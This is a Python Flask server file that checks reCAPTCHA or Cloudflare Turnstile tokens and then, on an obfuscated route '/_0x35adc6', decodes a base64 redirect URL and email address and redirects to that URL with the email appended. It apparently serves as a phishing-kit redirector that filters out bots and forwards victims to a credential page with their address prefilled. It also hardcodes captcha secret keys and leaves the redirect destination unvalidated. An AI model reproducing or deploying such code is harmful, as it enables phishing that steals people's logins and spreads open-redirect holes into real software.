import os
import base64
import requests
from flask import Flask, request, redirect, send_file, jsonify

app = Flask(__name__)

RECAPTCHA_SECRET = os.environ.get("RECAPTCHA_SECRET", "6LcRoO8rAAAAAC8ovROBZoC7kqxvm82l9_hs03r6")
TURNSTILE_SECRET = os.environ.get("TURNSTILE_SECRET", "0x4AAAAAAB7cGXh4GEgIOyDOwsgtH-7QEsI")

@app.route("/")
def index():
    try:
        return send_file("static/index.html")
    except Exception as e:
        return f"Error loading index.html: {e}", 500

@app.route("/verify_recaptcha_init", methods=["POST"])
def verify_recaptcha_init():
    token = request.form.get("token")
    turnstile = request.form.get("turnstile")

    try:
        if token:
            res = requests.post(
                "https://www.google.com/recaptcha/api/siteverify",
                data={"secret": RECAPTCHA_SECRET, "response": token},
                timeout=10
            ).json()
            if res.get("success") and res.get("score", 0) >= 0.7:
                return jsonify({"status": "success", "score": res.get("score")})
            return jsonify({"status": "challenge", "score": res.get("score")})

        if turnstile:
            res = requests.post(
                "https://challenges.cloudflare.com/turnstile/v0/siteverify",
                data={"secret": TURNSTILE_SECRET, "response": turnstile},
                timeout=10
            ).json()
            if res.get("success"):
                return jsonify({"status": "success"})
            return jsonify({"status": "error"}), 403

        return jsonify({"status": "error"}), 400
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/_0x35adc6", methods=["POST"])
def final_redirect():
    r_b64 = request.form.get("r")
    email_b64 = request.form.get("email")
    token = request.form.get("token")
    turnstile = request.form.get("turnstile")

    if not r_b64 or not email_b64:
        return "Missing parameters", 400

    try:
        if token:
            res = requests.post(
                "https://www.google.com/recaptcha/api/siteverify",
                data={"secret": RECAPTCHA_SECRET, "response": token},
                timeout=10
            ).json()
            if not res.get("success"):
                return "reCAPTCHA failed", 403

        if turnstile:
            res = requests.post(
                "https://challenges.cloudflare.com/turnstile/v0/siteverify",
                data={"secret": TURNSTILE_SECRET, "response": turnstile},
                timeout=10
            ).json()
            if not res.get("success"):
                return "Turnstile failed", 403

        redirect_url = base64.b64decode(r_b64).decode()
        email_decoded = base64.b64decode(email_b64).decode()
    except Exception as e:
        return f"Error: {e}", 400

    sep = "&" if "?" in redirect_url else "?"
    final_url = f"{redirect_url}{sep}cc={email_decoded}"
    return redirect(final_url, 302)

if __name__ == "__main__":
    app.run(debug=True)
